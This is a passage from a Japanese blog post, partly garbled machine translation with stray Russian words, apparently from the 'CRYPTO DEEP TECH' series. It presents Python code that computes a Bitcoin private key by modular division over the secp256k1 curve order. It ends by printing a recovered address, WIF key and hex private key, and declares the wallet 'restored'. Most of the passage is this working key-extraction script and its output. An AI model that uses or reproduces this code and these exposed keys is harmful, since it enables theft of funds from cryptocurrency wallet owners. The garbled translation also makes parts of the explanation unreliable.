B = 0xdac19ec586ea8aa454fd2e7090e3244cdf75a73bdb1aa970d8b0878e75df3cae</code></pre>
<!-- /wp:code -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>ここで、3 つのビットコイン アドレスのいずれかの秘密鍵を取得するために、モジュロ除算を行う必要があります<code>значение A</code>。<code>значение B</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>Privkey = ((A * modinv(B,N)) % N)</code></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p><em>Python</em>スクリプトを使用しましょう:&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/08ReducePrivateKey/calculate.py" target="_blank" rel="noreferrer noopener">calculate.py</a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m

N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141

A = 0x00000000000000000000000000000000000000000000000000000000795f9c63
B = 0xdac19ec586ea8aa454fd2e7090e3244cdf75a73bdb1aa970d8b0878e75df3cae


print (h(((A) * modinv(B,N)) % N))
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><em>Python</em>スクリプトを実行してみましょう:&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/08ReducePrivateKey/calculate.py" target="_blank" rel="noreferrer noopener">calculate.py</a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 calculate.py</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/750/f71/837/750f71837b11f35eb3f067cc0499c558.png" alt="その結果、ターミナルで HEX 形式の秘密鍵を受け取ります" title="その結果、ターミナルで HEX 形式の秘密鍵を受け取ります"/><figcaption class="wp-element-caption">その結果、ターミナルで HEX 形式の秘密鍵を受け取ります</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">ビットアドレス</a>を開いて確認しましょう：</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ADDR: 1MjGyKiRLzq4WeuJKyFZMmkjAv7rH1TABm
WIF:  5JF9ME7zdGLDd3oyuMG7RfwgA1ByjZb2LbSwRMwM8ZKBADFLfCx
HEX:  38717b5161c2e817020a0933e1836dd0127bdef59732d77daca20ccfbf61a7ae</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/eb4/d76/c11/eb4d76c11de49bd6114bcb2b5409cdc4.png" alt="ECPy + Google Colab ライブラリを使用したスカラー倍算による秘密鍵の削減"/></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2>秘密鍵が見つかりました!</h2>
<!-- /wp:heading -->

<!-- wp:heading -->
<h2>ビットコインウォレット復活！</h2>
<!-- /wp:heading -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/d05/dfb/7d1/d05dfb7d1f9a7217cf7f88bd11b969e7.png" alt="www.blockchain.com/btc/address/1MjGyKiRLzq4WeuJKyFZMmkjAv7rH1TABm" title="www.blockchain.com/btc/address/1MjGyKiRLzq4WeuJKyFZMmkjAv7rH1TABm"/><figcaption class="wp-element-caption">www.blockchain.com/btc/address/1MjGyKiRLzq4WeuJKyFZMmkjAv7rH1TABm</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://cryptodeep.ru/" target="_blank" rel="noreferrer noopener"><strong>このビデオは、 CRYPTO DEEP TECH</strong></a>ポータル向けに作成されたもので、&nbsp;&nbsp;暗号通貨&nbsp;<code>secp256k1</code>&nbsp;の弱い署名に対して&nbsp;&nbsp;楕円曲線上でデータと暗号の財務的セキュリティを確保します。&nbsp;<code>ECDSA</code><code>BITCOIN</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/CryptoDeepTools/tree/main/08ReducePrivateKey" target="_blank" rel="noreferrer noopener"><strong>ソース</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://t.me/cryptodeeptech"><strong>電報</strong></a><strong>:&nbsp;&nbsp;</strong><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener"><strong><u>https://t.me/cryptodeeeptech</u></strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://youtu.be/zu2yiaZ_LOs" target="_blank" rel="noreferrer noopener"><strong>ビデオ: https://youtu.be/zu2yiaZ_LOs</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://cryptodeep.ru/reduce-private-key"><strong>ソース:&nbsp;</strong></a><a href="https://cryptodeep.ru/reduce-private-key" target="_blank" rel="noreferrer noopener"><strong>https://cryptodeeep.ru/reduce-private-key</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":2410} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/03/012-1024x576.png" alt="Уменьшение приватного ключа через скалярное умножение используем библиотеку ECPy + Google Colab" class="wp-image-2410"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>&nbsp;<a href="https://cryptodeep.ru/category/%d0%ba%d1%80%d0%b8%d0%bf%d1%82%d0%be%d0%b0%d0%bd%d0%b0%d0%bb%d0%b8%d0%b7/">暗号解読</a></p>
<!-- /wp:paragraph -->
